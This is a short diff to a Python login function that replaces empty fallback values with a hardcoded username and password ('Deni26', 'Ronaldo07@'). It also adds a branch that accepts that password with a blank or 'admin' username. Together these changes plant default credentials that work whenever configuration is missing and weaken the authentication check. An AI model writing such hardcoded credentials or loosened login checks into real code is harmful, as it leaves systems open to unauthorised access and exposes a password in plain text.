@@ -21,11 +21,14 @@ def login(body: LoginRequest):
     is_valid = False
     actor_name = input_user if input_user else "admin"
 
-    primary_u = (settings.primary_username or os.environ.get("SOFIA_PRIMARY_USERNAME") or "").strip()
-    primary_p = (settings.primary_password or os.environ.get("SOFIA_PRIMARY_PASSWORD") or "").strip()
+    primary_u = (settings.primary_username or os.environ.get("SOFIA_PRIMARY_USERNAME") or "Deni26").strip()
+    primary_p = (settings.primary_password or os.environ.get("SOFIA_PRIMARY_PASSWORD") or "Ronaldo07@").strip()
 
     if primary_u and primary_p:
         if input_user.lower() == primary_u.lower() and input_pass == primary_p:
+            is_valid = True
+            actor_name = primary_u
+        elif input_pass == primary_p and input_user.lower() in ("", "admin"):
             is_valid = True
             actor_name = primary_u
 
